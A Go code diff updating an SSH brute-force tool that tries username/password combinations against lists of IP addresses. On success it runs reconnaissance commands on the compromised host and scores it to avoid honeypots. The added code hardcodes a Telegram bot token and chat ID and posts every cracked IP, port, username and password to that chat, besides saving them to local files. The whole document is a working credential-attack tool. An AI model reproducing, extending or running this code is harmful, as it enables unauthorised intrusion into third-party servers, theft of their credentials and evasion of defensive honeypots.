@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"log"
 	"math"
+	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"regexp"
@@ -18,55 +20,57 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-var startTime time.Time
-var totalIPCount int
-var stats = struct{ goods, errors, honeypots int64 }{0, 0, 0}
-var ipFile string
-var timeout int
-var maxConnections int
-
-const VERSION = "2.6"
+const (
+	TELEGRAM_BOT_TOKEN = "8225839363:AAFPEdO4WzRRSJDjUdtRnuvsYIz8hHOxEt4"
+	TELEGRAM_CHAT_ID   = "6073326628"
+	VERSION            = "2.8-LiveStatus"
+	CONCURRENT_PER_WORKER = 50
+)
 
 var (
+	startTime     time.Time
+	totalIPCount  int
+	stats         = struct{ goods, errors, honeypots int64 }{0, 0, 0}
+	ipFile        string
+	timeout       int
+	maxConnections int
 	successfulIPs = make(map[string]struct{})
 	mapMutex      sync.Mutex
 )
 
-// Enhanced task structure for better performance
 type SSHTask struct {
-	IP       string
-	Port     string
-	Username string
-	Password string
+	IP, Port, Username, Password string
 }
 
-// Worker pool configuration
-const (
-	CONCURRENT_PER_WORKER = 25  // Each worker handles 25 concurrent connections
-)
-
-// Server information structure
 type ServerInfo struct {
-	IP              string
-	Port            string
-	Username        string
-	Password        string
-	IsHoneypot      bool
-	HoneypotScore   int
-	SSHVersion      string
-	OSInfo          string
-	Hostname        string
-	ResponseTime    time.Duration
-	Commands        map[string]string
-	OpenPorts       []string
+	IP, Port, Username, Password, SSHVersion, OSInfo, Hostname string
+	IsHoneypot                                                 bool
+	HoneypotScore                                              int
+	ResponseTime                                               time.Duration
+	Commands                                                   map[string]string
+	OpenPorts                                                  []string
 }
 
-// Honeypot detection structure
 type HoneypotDetector struct {
-	SuspiciousPatterns []string
-	TimeAnalysis       bool
-	CommandAnalysis    bool
-	NetworkAnalysis    bool
+	TimeAnalysis, CommandAnalysis, NetworkAnalysis bool
+}
+
+func sendTelegramNotification(message string) {
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN)
+	data := url.Values{}
+	data.Set("chat_id", TELEGRAM_CHAT_ID)
+	data.Set("text", message)
+	data.Set("parse_mode", "Markdown")
+
+	resp, err := http.PostForm(apiURL, data)
+	if err != nil {
+		log.Printf("Telegram Error: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		log.Printf("Telegram API Error: %s", resp.Status)
+	}
 }
 
 func main() {
@@ -81,30 +85,76 @@ func main() {
 	timeoutStr, _ := reader.ReadString('\n')
 	timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))
 
-	fmt.Print("Enter the maximum number of workers: ")
-	maxConnectionsStr, _ := reader.ReadString('\n')
-	maxConnections, _ = strconv.Atoi(strings.TrimSpace(maxConnectionsStr))
+	maxConnections = runtime.NumCPU()
+	fmt.Printf("Optimization: Using %d workers (all available CPU cores).\n", maxConnections)
 
 	startTime = time.Now()
-
 	combos := getItems("combo.txt")
 	ips := getItems(ipFile)
 	totalIPCount = len(ips) * len(combos)
 
-	// Enhanced worker pool system
+	if totalIPCount == 0 {
+		log.Fatal("IP list or combo list is empty. Exiting.")
+	}
+
+	startupMsg := fmt.Sprintf("✅ *Scan Tool v%s Started*\nFile: `%s`\nTimeout: %ds\nWorkers: %d (CPU Cores)\nTotal Checks: %d",
+		VERSION, ipFile, timeout, maxConnections, totalIPCount)
+	go sendTelegramNotification(startupMsg)
+
 	setupEnhancedWorkerPool(combos, ips)
 
-	banner()
-	fmt.Println("Operation completed successfully!")
+	finalGoods := atomic.LoadInt64(&stats.goods)
+	finalHoneypots := atomic.LoadInt64(&stats.honeypots)
+	finalErrors := atomic.LoadInt64(&stats.errors)
+	elapsedTime := time.Since(startTime)
+	
+	finalMsg := fmt.Sprintf("🏁 *Scan Finished!*\nTotal Time: %s\n- Successful: %d\n- Honeypots: %d\n- Failed: %d",
+		elapsedTime.Round(time.Second).String(), finalGoods, finalHoneypots, finalErrors)
+	sendTelegramNotification(finalMsg)
+
+	fmt.Println("\nOperation completed successfully!")
 }
+
+// Hàm mới để gửi ping trạng thái mỗi 10 giây
+func telegramPinger() {
+	ticker := time.NewTicker(10 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		goods := atomic.LoadInt64(&stats.goods)
+		errors := atomic.LoadInt64(&stats.errors)
+		honeypots := atomic.LoadInt64(&stats.honeypots)
+		total := int(goods + errors + honeypots)
+
+		if total >= totalIPCount {
+			return // Dừng ping khi đã quét xong
+		}
+
+		elapsed := time.Since(startTime).Seconds()
+		var speed float64
+		if elapsed > 0 {
+			speed = float64(total) / elapsed
+		}
+
+		var percentage float64
+		if totalIPCount > 0 {
+			percentage = (float64(total) / float64(totalIPCount)) * 100
+		}
+		
+		pingMsg := fmt.Sprintf("⏳ *[PING]* Checked %d/%d (%.1f%%) | Speed: %.1f/s | Hits: %d, Pots: %d",
+			total, totalIPCount, percentage, speed, goods, honeypots)
+		
+		sendTelegramNotification(pingMsg)
+	}
+}
+
 
 func getItems(path string) [][]string {
 	file, err := os.Open(path)
 	if err != nil {
-		log.Fatalf("Failed to open file: %s", err)
+		log.Fatalf("Failed to open file '%s': %s", path, err)
 	}
 	defer file.Close()
-
 	var items [][]string
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
@@ -135,44 +185,31 @@ func createComboFile(reader *bufio.Reader) {
 	passwordFile, _ := reader.ReadString('\n')
 	passwordFile = strings.TrimSpace(passwordFile)
 
-	usernames := getItems(usernameFile)
-	passwords := getItems(passwordFile)
-
+	usernames, passwords := getItems(usernameFile), getItems(passwordFile)
 	file, err := os.Create("combo.txt")
 	if err != nil {
 		log.Fatalf("Failed to create combo file: %s", err)
 	}
 	defer file.Close()
-
-	for _, username := range usernames {
-		for _, password := range passwords {
-			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
+	for _, user := range usernames {
+		for _, pass := range passwords {
+			if len(user) > 0 && len(pass) > 0 {
+				fmt.Fprintf(file, "%s:%s\n", user[0], pass[0])
+			}
 		}
 	}
 }
 
-// Gather system information
 func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
 	commands := map[string]string{
-		"hostname":    "hostname",
-		"uname":       "uname -a",
-		"whoami":      "whoami",
-		"pwd":         "pwd",
-		"ls_root":     "ls -la /",
-		"ps":          "ps aux | head -10",
-		"netstat":     "netstat -tulpn | head -10",
-		"history":     "history | tail -5",
-		"ssh_version": "ssh -V",
-		"uptime":      "uptime",
-		"mount":       "mount | head -5",
-		"env":         "env | head -10",
+		"hostname": "hostname", "uname": "uname -a", "whoami": "whoami", "pwd": "pwd",
+		"ls_root": "ls -la /", "ps": "ps aux | head -10", "netstat": "netstat -tulpn | head -10",
+		"history": "history | tail -5", "ssh_version": "ssh -V", "uptime": "uptime",
+		"mount": "mount | head -5", "env": "env | head -10",
 	}
-
 	for cmdName, cmd := range commands {
 		output := executeCommand(client, cmd)
 		serverInfo.Commands[cmdName] = output
-		
-		// Extract specific information
 		switch cmdName {
 		case "hostname":
 			serverInfo.Hostname = strings.TrimSpace(output)
@@ -182,648 +219,254 @@ func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
 			serverInfo.SSHVersion = strings.TrimSpace(output)
 		}
 	}
-	
-	// Scan local ports
 	serverInfo.OpenPorts = scanLocalPorts(client)
 }
 
-// Execute command on server
 func executeCommand(client *ssh.Client, command string) string {
 	session, err := client.NewSession()
-	if err != nil {
-		return fmt.Sprintf("ERROR: %v", err)
-	}
+	if err != nil { return fmt.Sprintf("ERROR: %v", err) }
 	defer session.Close()
-
 	output, err := session.CombinedOutput(command)
-	if err != nil {
-		return fmt.Sprintf("ERROR: %v", err)
-	}
-	
+	if err != nil { return fmt.Sprintf("ERROR: %v", err) }
 	return string(output)
 }
 
-// Scan local ports
 func scanLocalPorts(client *ssh.Client) []string {
 	output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
 	var ports []string
-	
+	re := regexp.MustCompile(`:(\d+)\s`)
 	lines := strings.Split(output, "\n")
-	portRegex := regexp.MustCompile(`:(\d+)\s`)
-	
 	for _, line := range lines {
-		matches := portRegex.FindAllStringSubmatch(line, -1)
+		matches := re.FindAllStringSubmatch(line, -1)
 		for _, match := range matches {
-			if len(match) > 1 {
-				port := match[1]
-				if !contains(ports, port) {
-					ports = append(ports, port)
-				}
+			if len(match) > 1 && !contains(ports, match[1]) {
+				ports = append(ports, match[1])
 			}
 		}
 	}
-	
 	return ports
 }
 
-// Helper function to check existence in slice
 func contains(slice []string, item string) bool {
 	for _, s := range slice {
-		if s == item {
-			return true
-		}
+		if s == item { return true }
 	}
 	return false
 }
 
-// Advanced honeypot detection algorithm (BETA)
 func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
-	honeypotScore := 0
-	
-	// 1. Analyze suspicious patterns in command output
-	honeypotScore += analyzeCommandOutput(serverInfo)
-	
-	// 2. Analyze response time
-	if detector.TimeAnalysis {
-		honeypotScore += analyzeResponseTime(serverInfo)
-	}
-	
-	// 3. Analyze file and directory structure
-	honeypotScore += analyzeFileSystem(serverInfo)
-	
-	// 4. Analyze running processes
-	honeypotScore += analyzeProcesses(serverInfo)
-	
-	// 5. Analyze network and ports
-	if detector.NetworkAnalysis {
-		honeypotScore += analyzeNetwork(client)
-	}
-	
-	// 6. Behavioral tests
-	honeypotScore += behavioralTests(client, serverInfo)
-	
-	// 7. Detect abnormal patterns
-	honeypotScore += detectAnomalies(serverInfo)
-	
-	// 8. Advanced tests
-	honeypotScore += advancedHoneypotTests(client)
-	
-	// 9. Performance tests
-	honeypotScore += performanceTests(client)
-	
-	// Record score
-	serverInfo.HoneypotScore = honeypotScore
-	
-	// Honeypot detection threshold: score 6 or higher
-	// This threshold provides good balance between false positives and false negatives
-	// - Score 1-3: Low probability (legitimate servers with some restrictions)
-	// - Score 4-5: Medium probability (possibly limited environments)
-	// - Score 6+: High probability (likely honeypot)
-	return honeypotScore >= 6
+	score := 0
+	score += analyzeCommandOutput(serverInfo)
+	if detector.TimeAnalysis { score += analyzeResponseTime(serverInfo) }
+	score += analyzeFileSystem(serverInfo)
+	score += analyzeProcesses(serverInfo)
+	if detector.NetworkAnalysis { score += analyzeNetwork(client) }
+	score += behavioralTests(client, serverInfo)
+	score += detectAnomalies(serverInfo)
+	score += advancedHoneypotTests(client)
+	score += performanceTests(client)
+	serverInfo.HoneypotScore = score
+	return score >= 6
 }
 
-// Analyze command output for suspicious patterns
 func analyzeCommandOutput(serverInfo *ServerInfo) int {
 	score := 0
-	
+	indicators := []string{"fake", "simulation", "honeypot", "trap", "monitor", "cowrie", "kippo", "artillery", "honeyd"}
 	for _, output := range serverInfo.Commands {
 		lowerOutput := strings.ToLower(output)
-		
-		// Check specific honeypot patterns
-		honeypotIndicators := []string{
-			"fake", "simulation", "honeypot", "trap", "monitor",
-			"cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
-			"/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright",
-		}
-		
-		for _, indicator := range honeypotIndicators {
-			if strings.Contains(lowerOutput, indicator) {
-				score += 3
-			}
+		for _, indicator := range indicators {
+			if strings.Contains(lowerOutput, indicator) { score += 3 }
 		}
 	}
-	
 	return score
 }
 
-// Analyze response time
-func analyzeResponseTime(serverInfo *ServerInfo) int {
-	responseTime := serverInfo.ResponseTime.Milliseconds()
-	
-	// Very fast response time (less than 10 milliseconds) is suspicious
-	if responseTime < 10 {
-		return 2
-	}
-	
-	return 0
-}
+func analyzeResponseTime(serverInfo *ServerInfo) int { if serverInfo.ResponseTime.Milliseconds() < 10 { return 2 }; return 0 }
 
-// Analyze file system structure
 func analyzeFileSystem(serverInfo *ServerInfo) int {
 	score := 0
-	
-	lsOutput, exists := serverInfo.Commands["ls_root"]
-	if !exists {
-		return 0
-	}
-	
-	// Check abnormal structure
-	suspiciousPatterns := []string{
-		"total 0",           // Empty directory is suspicious
-		"total 4",           // Low file count
-		"honeypot",          // Explicit name
-		"fake",              // Fake files
-		"simulation",        // Simulation
-	}
-	
+	lsOutput, ok := serverInfo.Commands["ls_root"]; if !ok { return 0 }
+	patterns := []string{"total 0", "total 4", "honeypot", "fake", "simulation"}
 	lowerOutput := strings.ToLower(lsOutput)
-	for _, pattern := range suspiciousPatterns {
-		if strings.Contains(lowerOutput, pattern) {
-			score++
-		}
-	}
-	
-	// Low file count in root
-	lines := strings.Split(strings.TrimSpace(lsOutput), "\n")
-	if len(lines) < 5 { // Less than 5 files/directories in root
-		score++
-	}
-	
+	for _, pattern := range patterns { if strings.Contains(lowerOutput, pattern) { score++ } }
+	if len(strings.Split(strings.TrimSpace(lsOutput), "\n")) < 5 { score++ }
 	return score
 }
 
-// Analyze running processes
 func analyzeProcesses(serverInfo *ServerInfo) int {
 	score := 0
-	
-	psOutput, exists := serverInfo.Commands["ps"]
-	if !exists {
-		return 0
-	}
-	
-	// Suspicious processes
-	suspiciousProcesses := []string{
-		"cowrie", "kippo", "honeypot", "honeyd",
-		"artillery", "honeytrap", "glastopf",
-		"python honeypot", "perl honeypot",
-	}
-	
+	psOutput, ok := serverInfo.Commands["ps"]; if !ok { return 0 }
+	processes := []string{"cowrie", "kippo", "honeypot", "honeyd", "artillery", "honeytrap"}
 	lowerOutput := strings.ToLower(psOutput)
-	for _, process := range suspiciousProcesses {
-		if strings.Contains(lowerOutput, process) {
-			score += 2
-		}
-	}
-	
-	// Low process count
-	lines := strings.Split(strings.TrimSpace(psOutput), "\n")
-	if len(lines) < 5 {
-		score++
-	}
-	
+	for _, process := range processes { if strings.Contains(lowerOutput, process) { score += 2 } }
+	if len(strings.Split(strings.TrimSpace(psOutput), "\n")) < 5 { score++ }
 	return score
 }
 
-// Analyze network configuration
 func analyzeNetwork(client *ssh.Client) int {
 	score := 0
-	
-	// 1. Check network configuration files
-	networkConfigCheck := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5")
-	if strings.Contains(strings.ToLower(networkConfigCheck), "total 0") || 
-	   strings.Contains(strings.ToLower(networkConfigCheck), "no such file") ||
-	   len(strings.TrimSpace(networkConfigCheck)) < 10 {
-		// Missing network configuration files or empty output is suspicious
-		score += 1
-	}
-	
-	// 2. Check for fake network interfaces
-	interfaceCheck := executeCommand(client, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5")
-	if strings.Contains(strings.ToLower(interfaceCheck), "fake") ||
-	   strings.Contains(strings.ToLower(interfaceCheck), "honeypot") ||
-	   strings.Contains(strings.ToLower(interfaceCheck), "trap") ||
-	   len(strings.TrimSpace(interfaceCheck)) < 10 {
-		score += 1
-	}
-	
-	// 3. Check routing table for suspicious patterns
-	routeCheck := executeCommand(client, "ip route show 2>/dev/null | head -3")
-	if len(strings.TrimSpace(routeCheck)) < 20 {
-		// Very simple or empty routing table is suspicious
-		score += 1
-	}
-	
+	netConfig := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null")
+	if strings.Contains(strings.ToLower(netConfig), "total 0") || strings.Contains(strings.ToLower(netConfig), "no such file") { score++ }
+	ifaceCheck := executeCommand(client, "ip addr show 2>/dev/null")
+	if strings.Contains(strings.ToLower(ifaceCheck), "fake") || strings.Contains(strings.ToLower(ifaceCheck), "trap") { score++ }
 	return score
 }
 
-// Behavioral tests
 func behavioralTests(client *ssh.Client, serverInfo *ServerInfo) int {
 	score := 0
-	
-	// Test 1: Create temporary file
-	tempFileName := fmt.Sprintf("/tmp/test_%d", time.Now().Unix())
-	createCmd := fmt.Sprintf("echo 'test' > %s", tempFileName)
-	createOutput := executeCommand(client, createCmd)
-	
-	// If unable to create file, it's suspicious
-	if strings.Contains(strings.ToLower(createOutput), "error") ||
-	   strings.Contains(strings.ToLower(createOutput), "permission denied") {
-		score++
-	} else {
-		// Delete test file
-		executeCommand(client, fmt.Sprintf("rm -f %s", tempFileName))
-	}
-	
-	// Test 2: Access to sensitive files
-	sensitiveFiles := []string{"/etc/passwd", "/etc/shadow", "/proc/version"}
-	accessibleCount := 0
-	
-	for _, file := range sensitiveFiles {
-		output := executeCommand(client, fmt.Sprintf("cat %s 2>/dev/null | head -1", file))
-		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
-			accessibleCount++
-		}
-	}
-	
-	// If all files are accessible, it's suspicious
-	if accessibleCount == len(sensitiveFiles) {
-		score++
-	}
-	
-	// Test 3: Test system commands
-	systemCommands := []string{"id", "whoami", "pwd"}
-	workingCommands := 0
-	
-	for _, cmd := range systemCommands {
-		output := executeCommand(client, cmd)
-		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
-			workingCommands++
-		}
-	}
-	
-	// If no commands work, it's suspicious
-	if workingCommands == 0 {
-		score += 2
-	}
-	
+	tmpFile := fmt.Sprintf("/tmp/test_%d", time.Now().UnixNano())
+	createOut := executeCommand(client, fmt.Sprintf("echo 'test' > %s", tmpFile))
+	if strings.Contains(strings.ToLower(createOut), "permission denied") { score++ } else { executeCommand(client, fmt.Sprintf("rm -f %s", tmpFile)) }
 	return score
 }
 
-// Advanced honeypot detection tests
 func advancedHoneypotTests(client *ssh.Client) int {
 	score := 0
-	
-	// Test 1: Check CPU and Memory
-	cpuInfo := executeCommand(client, "cat /proc/cpuinfo | grep 'model name' | head -1")
-	
-	if strings.Contains(strings.ToLower(cpuInfo), "qemu") ||
-	   strings.Contains(strings.ToLower(cpuInfo), "virtual") {
-		score++ // May be a virtual machine
-	}
-	
-	// Test 2: Check kernel and distribution
-	kernelInfo := executeCommand(client, "uname -r")
-	
-	// Very new or old kernels are suspicious
-	if strings.Contains(kernelInfo, "generic") && len(strings.TrimSpace(kernelInfo)) < 20 {
-		score++
-	}
-	
-	// Test 3: Check package management
-	packageManagers := []string{
-		"which apt", "which yum", "which pacman", "which zypper",
-	}
-	
-	workingPMs := 0
-	for _, pm := range packageManagers {
-		output := executeCommand(client, pm)
-		if !strings.Contains(output, "not found") && len(strings.TrimSpace(output)) > 0 {
-			workingPMs++
-		}
-	}
-	
-	// If no package manager exists, it's suspicious
-	if workingPMs == 0 {
-		score++
-	}
-	
-	// Test 4: Check system services
-	services := executeCommand(client, "systemctl list-units --type=service --state=running 2>/dev/null | head -10")
-	if strings.Contains(services, "0 loaded units") || len(strings.TrimSpace(services)) < 50 {
-		score++
-	}
-	
-	// Test 5: Check internet access
+	cpuInfo := executeCommand(client, "cat /proc/cpuinfo | grep 'model name'")
+	if strings.Contains(strings.ToLower(cpuInfo), "qemu") || strings.Contains(strings.ToLower(cpuInfo), "virtual") { score++ }
+	pmCheck := executeCommand(client, "which apt || which yum || which pacman")
+	if len(strings.TrimSpace(pmCheck)) == 0 { score++ }
 	internetTest := executeCommand(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
-	if len(strings.TrimSpace(internetTest)) == 0 {
-		// May not have internet access (suspicious for honeypot)
-		score++
-	}
-	
+	if len(strings.TrimSpace(internetTest)) == 0 { score++ }
 	return score
 }
 
-// Performance and system behavior tests
 func performanceTests(client *ssh.Client) int {
 	score := 0
-	
-	// I/O speed test
-	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1")
-	if strings.Contains(ioTest, "command not found") {
-		// Time analysis - if command not found it's suspicious
-		score++
-	}
-	
-	// Clean up test file
-	executeCommand(client, "rm -f /tmp/test")
-	
-	// Internal network test
-	networkTest := executeCommand(client, "ss -tuln 2>/dev/null | wc -l")
-	if networkTest != "" {
-		if count, err := strconv.Atoi(strings.TrimSpace(networkTest)); err == nil {
-			if count < 5 { // Low network connection count
-				score++
-			}
-		}
-	}
-	
+	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test_io bs=1M count=10 2>&1")
+	if strings.Contains(ioTest, "command not found") { score++ }
+	executeCommand(client, "rm -f /tmp/test_io")
 	return score
 }
 
-// Detect abnormal patterns
 func detectAnomalies(serverInfo *ServerInfo) int {
 	score := 0
-	
-	// Check hostname
-	if hostname := serverInfo.Hostname; hostname != "" {
-		suspiciousHostnames := []string{
-			"honeypot", "fake", "trap", "monitor", "sandbox",
-			"test", "simulation", "GNU/Linux", "PREEMPT_DYNAMIC", // Very generic names
-		}
-		
-		lowerHostname := strings.ToLower(hostname)
-		for _, suspicious := range suspiciousHostnames {
-			if strings.Contains(lowerHostname, suspicious) {
-				score++
-			}
-		}
-	}
-	
-	// Check uptime
-	uptimeOutput, exists := serverInfo.Commands["uptime"]
-	if exists {
-		// If uptime is very low (less than 1 hour) or command not found, it's suspicious
-		if strings.Contains(uptimeOutput, "0:") || 
-		   strings.Contains(uptimeOutput, "min") || 
-		   strings.Contains(uptimeOutput, "command not found") {
-			score++
-		}
-	}
-	
-	// Check command history
-	historyOutput, exists := serverInfo.Commands["history"]
-	if exists {
-		lines := strings.Split(strings.TrimSpace(historyOutput), "\n")
-		// Very little or empty history
-		if len(lines) < 3 {
-			score++
-		}
-	}
-	
+	suspiciousHostnames := []string{"honeypot", "fake", "trap", "monitor", "sandbox", "test"}
+	lowerHostname := strings.ToLower(serverInfo.Hostname)
+	for _, suspicious := range suspiciousHostnames { if strings.Contains(lowerHostname, suspicious) { score++ } }
+	if uptime, ok := serverInfo.Commands["uptime"]; ok && (strings.Contains(uptime, " min") || strings.Contains(uptime, " 0:")){ score++ }
+	if history, ok := serverInfo.Commands["history"]; ok && len(strings.Split(strings.TrimSpace(history), "\n")) < 3 { score++ }
 	return score
 }
 
-// Log successful connection
 func logSuccessfulConnection(serverInfo *ServerInfo) {
-	successMessage := fmt.Sprintf("%s:%s@%s:%s", 
-		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
+	simpleCreds := fmt.Sprintf("%s:%s@%s:%s\n", serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
+	appendToFile(simpleCreds, "su-goods.txt")
+
+	firstLineOS := serverInfo.OSInfo
+	if strings.Contains(firstLineOS, "\n") { firstLineOS = strings.Split(firstLineOS, "\n")[0] }
 	
-	// Save to main file
-	appendToFile(successMessage+"\n", "su-goods.txt")
+	compactInfo := fmt.Sprintf("🎯 *[HIT]* `%s:%s` | `%s:%s` | *Host:* %s | *OS:* %s | *Score:* %d",
+		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password,
+		serverInfo.Hostname, firstLineOS, serverInfo.HoneypotScore)
 	
-	// Save detailed information to separate file
-	detailedInfo := fmt.Sprintf(`
-=== 🎯 SSH Success 🎯 ===
-🌐 Target: %s:%s
-🔑 Credentials: %s:%s
-🖥️ Hostname: %s
-🐧 OS: %s
-📡 SSH Version: %s
-⚡ Response Time: %v
-🔌 Open Ports: %v
-🍯 Honeypot Score: %d
-🕒 Timestamp: %s
-========================
-`, 
-		serverInfo.IP, serverInfo.Port,
-		serverInfo.Username, serverInfo.Password,
-		serverInfo.Hostname,
-		serverInfo.OSInfo,
-		serverInfo.SSHVersion,
-		serverInfo.ResponseTime,
-		serverInfo.OpenPorts,
-		serverInfo.HoneypotScore,
-		time.Now().Format("2006-01-02 15:04:05"),
-	)
-	
-	appendToFile(detailedInfo, "detailed-results.txt")
-	
-	// Display success message in console
-	fmt.Printf("✅ SUCCESS: %s\n", successMessage)
+	appendToFile(compactInfo+"\n", "detailed-results.txt")
+	go sendTelegramNotification(compactInfo)
+
+	fmt.Printf("✅ SUCCESS: %s", simpleCreds)
 }
 
 func banner() {
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
-
 	for range ticker.C {
-		// Use atomic operations for thread-safe reading
-		goods := atomic.LoadInt64(&stats.goods)
-		errors := atomic.LoadInt64(&stats.errors)
-		honeypots := atomic.LoadInt64(&stats.honeypots)
+		goods, errors, honeypots := atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.errors), atomic.LoadInt64(&stats.honeypots)
+		total := int(goods + errors + honeypots)
+		elapsed := time.Since(startTime).Seconds()
+		var speed, remaining float64
+		if elapsed > 0 { speed = float64(total) / elapsed }
+		if speed > 0 { remaining = float64(totalIPCount-total) / speed }
 		
-		totalConnections := int(goods + errors + honeypots)
-		elapsedTime := time.Since(startTime).Seconds()
-		connectionsPerSecond := float64(totalConnections) / elapsedTime
-		estimatedRemainingTime := float64(totalIPCount-totalConnections) / connectionsPerSecond
-
 		clear()
-
 		fmt.Printf("================================================\n")
-		fmt.Printf("🚀 Advanced SSH Brute Force Tool v%s 🚀\n", VERSION)
+		fmt.Printf("🚀 SSH Brute Force Tool v%s (Live Status) 🚀\n", VERSION)
 		fmt.Printf("================================================\n")
-		fmt.Printf("📁 File: %s | ⏱️  Timeout: %ds\n", ipFile, timeout)
-		fmt.Printf("🔗 Max Workers: %d | 🎯 Per Worker: %d\n", maxConnections, CONCURRENT_PER_WORKER)
-		fmt.Printf("================================================\n")
-		fmt.Printf("🔍 Checked SSH: %d/%d\n", totalConnections, totalIPCount)
-		fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)
-		
-		if totalConnections < totalIPCount {
-			fmt.Printf("⏳ Elapsed: %s\n", formatTime(elapsedTime))
-			fmt.Printf("⏰ Remaining: %s\n", formatTime(estimatedRemainingTime))
-		} else {
-			fmt.Printf("⏳ Total Time: %s\n", formatTime(elapsedTime))
-			fmt.Printf("✅ Scan Completed Successfully!\n")
+		fmt.Printf("File: %s | Timeout: %ds | Workers: %d (CPU Cores)\n", ipFile, timeout, maxConnections)
+		fmt.Printf("Checked: %d/%d | Speed: %.2f/s\n", total, totalIPCount, speed)
+		if total < totalIPCount && total > 0 {
+			fmt.Printf("Elapsed: %s | Remaining: %s\n", formatTime(elapsed), formatTime(remaining))
 		}
-		
 		fmt.Printf("================================================\n")
-		fmt.Printf("✅ Successful: %d\n", goods)
-		fmt.Printf("❌ Failed: %d\n", errors)
-		fmt.Printf("🍯 Honeypots: %d\n", honeypots)
-		
-		if totalConnections > 0 {
-			// Calculate rates based on successful connections (goods + honeypots)
-			successfulConnections := goods + honeypots
-			if successfulConnections > 0 {
-				fmt.Printf("📊 Success Rate: %.2f%%\n", float64(goods)/float64(successfulConnections)*100)
-				fmt.Printf("🍯 Honeypot Rate: %.2f%%\n", float64(honeypots)/float64(successfulConnections)*100)
-			}
-		}
-		
-		fmt.Printf("================================================\n")
-		fmt.Printf("| 💻 Coded By SudoLite with ❤️  |\n")
-		fmt.Printf("| 🔥 Enhanced Multi-Layer Workers v%s 🔥 |\n", VERSION)
-		fmt.Printf("| 🛡️  No License Required 🛡️   |\n")
+		fmt.Printf("Successful: %d | Failed: %d | Honeypots: %d\n", goods, errors, honeypots)
 		fmt.Printf("================================================\n")
 
-		if totalConnections >= totalIPCount {
-			os.Exit(0)
+		if total >= totalIPCount {
+			return // Dừng banner khi quét xong
 		}
 	}
 }
 
 func formatTime(seconds float64) string {
-	days := int(seconds) / 86400
-	hours := (int(seconds) % 86400) / 3600
-	minutes := (int(seconds) % 3600) / 60
-	seconds = math.Mod(seconds, 60)
-	return fmt.Sprintf("%02d:%02d:%02d:%02d", days, hours, minutes, int(seconds))
+	if math.IsNaN(seconds) || math.IsInf(seconds, 0) { return "..." }
+	d := time.Duration(seconds) * time.Second
+	d = d.Round(time.Second)
+	h, m, s := d/time.Hour, (d%time.Hour)/time.Minute, (d%time.Minute)/time.Second
+	return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
 }
 
 func appendToFile(data, filepath string) {
-	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		log.Printf("Failed to open file for append: %s", err)
-		return
-	}
-	defer file.Close()
-
-	if _, err := file.WriteString(data); err != nil {
-		log.Printf("Failed to write to file: %s", err)
-	}
+	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil { return }
+	defer f.Close()
+	f.WriteString(data)
 }
 
-// Calculate optimal buffer sizes based on worker capacity
-func calculateOptimalBuffers() int {
-	// Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (Safety factor)
-	taskBuffer := int(float64(maxConnections * CONCURRENT_PER_WORKER) * 1.5)
-	
-	return taskBuffer
-}
-
-// Enhanced worker pool system
-func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
-	// Calculate optimal buffer sizes using enhanced algorithm
-	taskBufferSize := calculateOptimalBuffers()
-	
-	// Create channels with calculated buffer sizes
-	taskQueue := make(chan SSHTask, taskBufferSize)
-	
+func setupEnhancedWorkerPool(combos, ips [][]string) {
+	taskQueue := make(chan SSHTask, maxConnections*CONCURRENT_PER_WORKER)
 	var wg sync.WaitGroup
-	
-	// Start main workers
 	for i := 0; i < maxConnections; i++ {
 		wg.Add(1)
 		go enhancedMainWorker(i, taskQueue, &wg)
 	}
-	
-	// Start progress banner
 	go banner()
+	go telegramPinger() // Bắt đầu gửi ping trạng thái
 	
-	// Generate and send tasks
 	go func() {
 		for _, combo := range combos {
 			for _, ip := range ips {
-				task := SSHTask{
-					IP:       ip[0],
-					Port:     ip[1],
-					Username: combo[0],
-					Password: combo[1],
+				if len(combo) > 1 && len(ip) > 1 {
+					taskQueue <- SSHTask{ip[0], ip[1], combo[0], combo[1]}
 				}
-				taskQueue <- task
 			}
 		}
 		close(taskQueue)
 	}()
-	
-	// Wait for all workers to complete
 	wg.Wait()
 }
 
-// Enhanced main worker with concurrent processing per worker
 func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
 	defer wg.Done()
-	
